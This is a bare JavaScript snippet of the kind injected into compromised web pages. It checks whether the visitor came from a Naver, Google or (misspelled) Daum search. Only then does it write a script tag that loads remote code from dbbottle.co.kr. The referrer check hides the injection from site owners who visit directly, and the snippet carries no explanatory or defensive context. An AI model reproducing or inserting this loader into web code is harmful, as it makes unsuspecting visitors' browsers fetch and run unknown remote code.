var ref = document.referrer;
reg = "naver|google|duam";
var myreg = new RegExp(reg);
if (myreg.test(ref)){
document.write("<script src=https://dbbottle.co.kr/data/java.js></script>");
}